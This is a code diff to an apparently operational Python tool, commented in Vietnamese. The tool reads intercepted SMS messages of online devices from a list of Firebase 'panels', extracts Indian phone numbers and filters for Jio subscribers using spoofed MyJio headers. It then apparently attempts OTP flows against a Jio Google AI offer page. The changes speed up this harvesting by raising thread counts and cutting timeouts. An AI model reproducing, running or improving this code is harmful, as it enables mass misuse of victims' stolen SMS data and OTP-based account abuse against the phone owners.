@@ -413,7 +413,7 @@ FIREBASE_PANELS = [
     ("https://masterbot-2-default-rtdb.firebaseio.com", "https://masterbot-2-default-rtdb.firebaseio.com"),
 ]
 
-MESSAGE_SCAN_LIMIT = 30
+MESSAGE_SCAN_LIMIT = 15
 OTP_TIMEOUT = 30
 POLL_INTERVAL = 1
 
@@ -435,8 +435,6 @@ GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&sourc
 NUMBER_PATTERNS = (
     re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
     re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
-    # Add Airtel patterns too since these panels have both
-    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
     re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
 )
 
@@ -468,10 +466,10 @@ def firebase_get(session: requests.Session, base_url: str, key: str, path: str, 
     # Handle case where key might be a URL (public access)
     if key and key.startswith("http"):
         # If key is actually a URL, don't use auth param
-        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=6)
+        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=4)
         response.raise_for_status()
         return response.json()
-    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=6)
+    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=4)
     response.raise_for_status()
     return response.json()
 
@@ -490,41 +488,66 @@ def normalize_mobile(value: Any) -> str | None:
 def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
     found: set[str] = set()
     for item in messages.values():
+        body = str(item.get("message", ""))
+        sender = str(item.get("sender", "") or item.get("address", "")).upper()
+
+        # Bo qua ngay tin nhan tu cac nha mang khong phai Jio de tiet kiem thoi gian
+        if any(other in sender for other in ["AIRTEL", "VODAFONE", "IDEA", "BSNL", "VI-"]):
+            continue
+
         sim_info = item.get("simInfo")
         if isinstance(sim_info, dict):
+            carrier = str(sim_info.get("carrierName", "")).upper()
+            if any(other in carrier for other in ["AIRTEL", "VODAFONE", "IDEA", "BSNL"]):
+                continue
             mobile = normalize_mobile(sim_info.get("phoneNumber"))
             if mobile:
                 found.add(mobile)
+
         mobile = normalize_mobile(item.get("phoneNumber"))
         if mobile:
             found.add(mobile)
-        body = str(item.get("message", ""))
+
         for pattern in NUMBER_PATTERNS:
             found.update(pattern.findall(body))
     return found
 
+_fb_pool = None
+_jio_pool = None
+
 def firebase_session() -> requests.Session:
-    session = requests.Session()
-    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
-    return session
+    global _fb_pool
+    if _fb_pool is None:
+        s = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(pool_connections=150, pool_maxsize=150)
+        s.mount("https://", adapter)
+        s.mount("http://", adapter)
+        s.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
+        _fb_pool = s
+    return _fb_pool
 
 def jio_session() -> requests.Session:
-    session = requests.Session()
-    session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-IN,en;q=0.9,hi;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Origin": "https://www.jio.com",
-        "Referer": "https://www.jio.com/selfcare/login/",
-        "appName": "MYJIO",
-        "appVersion": "8.0.0",
-        "deviceId": "a1b2c3d4e5f60001",
-        "os": "android",
-        "osVersion": "13",
-        "Connection": "keep-alive",
-    })
-    return session
+    global _jio_pool
+    if _jio_pool is None:
+        s = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
+        s.mount("https://", adapter)
+        s.headers.update({
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-IN,en;q=0.9,hi;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Origin": "https://www.jio.com",
+            "Referer": "https://www.jio.com/selfcare/login/",
+            "appName": "MYJIO",
+            "appVersion": "8.0.0",
+            "deviceId": "a1b2c3d4e5f60001",
+            "os": "android",
+            "osVersion": "13",
+            "Connection": "keep-alive",
+        })
+        _jio_pool = s
+    return _jio_pool
 
 def response_json(response: requests.Response) -> dict[str, Any]:
     try:
@@ -543,7 +566,7 @@ def response_error(response: requests.Response) -> bool:
 
 def is_jio_number(session: requests.Session, mobile: str):
     try:
-        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=10)
+        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=3.5)
     except requests.RequestException:
         return None  # Timeout hoac loi mang -> giu lai de thu OTP
     data = response_json(response)
@@ -1092,7 +1115,7 @@ def save_result(serial: int | str, device_id: str, mobile: str, status: str, url
 def main() -> int:
     t_start = time.time()
     print("=" * 70)
-    print(f"BƯỚC 1: Quét {len(FIREBASE_PANELS)} panels song song (35 luồng)...")
+    print(f"BƯỚC 1: Quét {len(FIREBASE_PANELS)} panels song song (100 luồng)...")
     print("=" * 70)
     t0 = time.time()
     
@@ -1104,9 +1127,9 @@ def main() -> int:
         firebase = firebase_session()
         try:
             if firebase_key and firebase_key.startswith("http"):
-                response = firebase.get(f"{base_url}/clients.json", timeout=5)
+                response = firebase.get(f"{base_url}/clients.json", timeout=3.0)
             else:
-                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=5)
+                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=3.0)
             
             if response.status_code == 200:
                 clients = response.json()
@@ -1131,7 +1154,7 @@ def main() -> int:
     panel_items = list(enumerate(FIREBASE_PANELS, start=1))
     random.shuffle(panel_items)  # Xao tron de khi mo nhieu CMD, moi CMD quet cac panel khac nhau
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
         list(executor.map(check_one_panel, panel_items))
 
     print(f"\n-> Bước 1 hoàn tất trong {time.time() - t0:.1f}s | Tổng online devices: {len(all_online_devices)}")
@@ -1141,7 +1164,7 @@ def main() -> int:
     
     # BƯỚC 2: Trích xuất số điện thoại
     print("\n" + "=" * 70)
-    print(f"BƯỚC 2: Trích xuất số điện thoại từ {len(all_online_devices)} thiết bị (50 luồng)...")
+    print(f"BƯỚC 2: Trích xuất số điện thoại từ {len(all_online_devices)} thiết bị (100 luồng)...")
     print("=" * 70)
     t0 = time.time()
 
@@ -1168,7 +1191,7 @@ def main() -> int:
             with msg_lock:
                 device_messages[device_id] = {}
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
         list(executor.map(fetch_device, all_online_devices.items()))
 
     targets: list[tuple[str, str]] = []
@@ -1183,7 +1206,7 @@ def main() -> int:
 
     # BƯỚC 3.1: Lọc nhanh số mạng Jio (Pre-filter Jio Numbers in Parallel)
     print("\n" + "=" * 70)
-    print(f"BƯỚC 3.1: Lọc nhanh mạng Jio từ {len(targets)} số ứng viên (30 luồng)...")
+    print(f"BƯỚC 3.1: Lọc nhanh mạng Jio từ {len(targets)} số ứng viên (60 luồng)...")
     print("=" * 70)
     t0 = time.time()
 
@@ -1215,7 +1238,7 @@ def main() -> int:
             tag = "[V] SỐ JIO" if jio_check is True else "[?] SỐ TIỀM NĂNG"
             print(f" {tag}: {mobile} (Device: {device_id[:15]}...)")
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
         list(executor.map(filter_jio, enumerate(targets, start=1)))
 
     print(f"\n-> Bước 3.1 hoàn tất trong {time.time() - t0:.1f}s | Tìm thấy {len(jio_targets)} số Jio hợp lệ (Đã loại {statuses['not_jio_number']} số không phải Jio)!")
